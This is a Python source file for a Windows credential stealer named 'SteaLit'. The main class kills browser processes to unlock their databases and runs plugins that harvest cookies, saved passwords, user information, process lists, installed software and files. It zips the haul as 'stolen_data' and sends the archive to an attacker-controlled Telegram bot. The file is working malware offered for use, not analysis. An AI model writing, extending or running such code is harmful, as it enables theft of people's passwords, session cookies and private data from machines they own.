#!/usr/bin/env python3
"""
SteaLit - Unified Information Gathering Tool
Combines cookies, passwords, user info, processes, installed software and files
Now with plugin system for easy extensibility
"""

import os
import sys
import time
import zipfile
import tempfile
import requests
from pathlib import Path
from typing import List, Dict, Any, Optional
from datetime import datetime
import traceback
from dotenv import load_dotenv

load_dotenv()

# Configuration
CONFIG = {
    "telegram": {
        "bot_token": os.getenv("BOT_TOKEN"),
        "chat_id": os.getenv("chat_id")
    },
    "output_dir": "SteaLit_Output",
    "archive_name": "stolen_data_{timestamp}.zip",
    "plugins": {
        "Cookies Extractor": True,
        "Passwords Extractor": True,
        "User Information": True,
        "Process List": True,
        "Installed Software": True,
        "File Grabber": False,  # Disabled by default due to potential size
    }
}

class SteaLit:
    """Main stealer class that coordinates all plugins"""
    
    def __init__(self):
        self.output_dir = Path(CONFIG["output_dir"])
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.archive_path = None
        self.results = {}
        
        from modules.plugin_system import get_default_plugin_manager
        self.plugin_manager = get_default_plugin_manager()
        
        plugins_dir = Path("plugins")
        if plugins_dir.exists():
            self.plugin_manager.load_plugins_from_directory(plugins_dir)
        
    def setup_output_directory(self):
        """Create output directory for this session"""
        session_dir = self.output_dir / self.session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        return session_dir
        
    def log_message(self, message: str, level: str = "INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
        
    def kill_browser_processes(self):
        """Kill browser processes to unlock databases"""
        browsers = [
            "chrome.exe", "msedge.exe", "opera.exe", "browser.exe",
            "brave.exe", "vivaldi.exe", "firefox.exe"
        ]
        
        self.log_message("Killing browser processes...")
        import subprocess
        
        for proc in browsers:
            try:
                result = subprocess.run(
                    ["taskkill", "/F", "/IM", proc],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    self.log_message(f"Killed {proc}")
                else:
                    if "not found" in result.stderr.lower() or "не найден" in result.stderr.lower():
                        pass  # Process not running
                    else:
                        self.log_message(f"Could not kill {proc}: {result.stderr.strip()}", "WARN")
            except Exception as e:
                self.log_message(f"Error killing {proc}: {e}", "ERROR")
    
    def run_plugins(self, session_dir: Path) -> int:
        """Run all enabled plugins"""
        enabled_plugins = self.plugin_manager.get_enabled_plugins(CONFIG["plugins"])
        successful_plugins = 0
        
        self.log_message(f"Found {len(enabled_plugins)} enabled plugins")
        
        for plugin in enabled_plugins:
            try:
                self.log_message(f"Starting plugin: {plugin.name}")
                
                if not plugin.check_dependencies():
                    self.log_message(f"Plugin {plugin.name} dependencies not satisfied", "WARN")
                    self.results[plugin.name] = {"status": "error", "error": "Dependencies not satisfied"}
                    continue
                
                success = self.plugin_manager.execute_plugin(plugin.name, session_dir)
                
                if success:
                    successful_plugins += 1
                    plugin_output_dir = session_dir / plugin.name.lower().replace(" ", "_")
                    output_files = plugin.get_output_files(plugin_output_dir)
                    
                    self.results[plugin.name] = {
                        "status": "success",
                        "output_dir": str(plugin_output_dir),
                        "files_created": [str(f) for f in output_files]
                    }
                    
                    self.log_message(f"Plugin {plugin.name} completed successfully")
                else:
                    self.results[plugin.name] = {"status": "error", "error": "Plugin execution failed"}
                    self.log_message(f"Plugin {plugin.name} failed", "ERROR")
                    
            except Exception as e:
                self.log_message(f"Plugin {plugin.name} crashed: {e}", "ERROR")
                self.results[plugin.name] = {"status": "error", "error": str(e)}
                
        return successful_plugins
    
    def create_archive(self, session_dir: Path) -> Optional[Path]:
        """Create ZIP archive with all collected data"""
        try:
            self.log_message("Creating archive...")
            
            archive_name = CONFIG["archive_name"].format(timestamp=self.session_id)
            archive_path = session_dir.parent / archive_name
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_path in session_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(session_dir)
                        zipf.write(file_path, arcname)
                
                summary = self.generate_session_summary()
                zipf.writestr("session_summary.txt", summary)
            
            self.archive_path = archive_path
            self.log_message(f"Archive created: {archive_path}")
            return archive_path
            
        except Exception as e:
            self.log_message(f"Archive creation failed: {e}", "ERROR")
            return None
    
    def generate_session_summary(self) -> str:
        """Generate summary of the session"""
        summary = []
        summary.append("=" * 50)
        summary.append("SteaLit Session Summary")
        summary.append("=" * 50)
        summary.append(f"Session ID: {self.session_id}")
        summary.append(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        summary.append("")
        
        summary.append("Plugin Results:")
        summary.append("-" * 20)
        
        for plugin_name, result in self.results.items():
            status = result.get("status", "unknown")
            summary.append(f"{plugin_name}: {status.upper()}")
            
            if status == "error":
                summary.append(f"  Error: {result.get('error', 'Unknown error')}")
            elif status == "success":
                if "files_created" in result:
                    summary.append(f"  Files created: {len(result['files_created'])}")
                if "output_dir" in result:
                    summary.append(f"  Output directory: {result['output_dir']}")
            summary.append("")
        
        return "\n".join(summary)
    
    def send_to_telegram(self, archive_path: Path) -> bool:
        """Send archive to Telegram"""
        try:
            self.log_message("Sending archive to Telegram...")
            
            bot_token = CONFIG["telegram"]["bot_token"]
            chat_id = CONFIG["telegram"]["chat_id"]
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            
            with open(archive_path, "rb") as f:
                files = {"document": f}
                data = {
                    "chat_id": chat_id,
                    "caption": f"SteaLit Data Collection - Session {self.session_id}"
                }
                
                response = requests.post(url, data=data, files=files, timeout=60)
                
            if response.status_code == 200:
                self.log_message("Archive successfully sent to Telegram")
                return True
            else:
                self.log_message(f"Failed to send to Telegram: {response.text}", "ERROR")
                return False
                
        except Exception as e:
            self.log_message(f"Telegram sending failed: {e}", "ERROR")
            return False
    
    def cleanup(self, session_dir: Path, keep_archive: bool = True):
        """Clean up temporary files"""
        try:
            self.log_message("Cleaning up...")
            
            import shutil
            if session_dir.exists():
                shutil.rmtree(session_dir, ignore_errors=True)
            
            if not keep_archive and self.archive_path and self.archive_path.exists():
                self.archive_path.unlink()
                
            self.log_message("Cleanup completed")
            
        except Exception as e:
            self.log_message(f"Cleanup failed: {e}", "ERROR")
    
    def run(self):
        """Main execution method"""
        start_time = time.time()
        self.log_message("Starting SteaLit execution...")
        
        try:
            session_dir = self.setup_output_directory()
            self.log_message(f"Session directory: {session_dir}")
            
            self.kill_browser_processes()
            time.sleep(2)
            
            successful_plugins = self.run_plugins(session_dir)
            total_enabled = len(self.plugin_manager.get_enabled_plugins(CONFIG["plugins"]))
            
            self.log_message(f"Completed {successful_plugins}/{total_enabled} plugins")
            
            archive_path = self.create_archive(session_dir)
            if not archive_path:
                self.log_message("Failed to create archive", "ERROR")
                return False
            
            telegram_success = self.send_to_telegram(archive_path)
            
            self.cleanup(session_dir, keep_archive=True)
            
            execution_time = time.time() - start_time
            self.log_message(f"Execution completed in {execution_time:.2f} seconds")
            self.log_message(f"Archive: {archive_path}")
            self.log_message(f"Telegram delivery: {'SUCCESS' if telegram_success else 'FAILED'}")
            
            return telegram_success
            
        except Exception as e:
            self.log_message(f"Critical error during execution: {e}", "ERROR")
            self.log_message(traceback.format_exc(), "ERROR")
            return False


def main():
    """Entry point"""
    if os.name != "nt":
        print("This tool is designed for Windows only.")
        return 1
    
    try:
        stealer = SteaLit()
        success = stealer.run()
        return 0 if success else 1
        
    except KeyboardInterrupt:
        print("\nExecution interrupted by user")
        return 1
    except Exception as e:
        print(f"Fatal error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
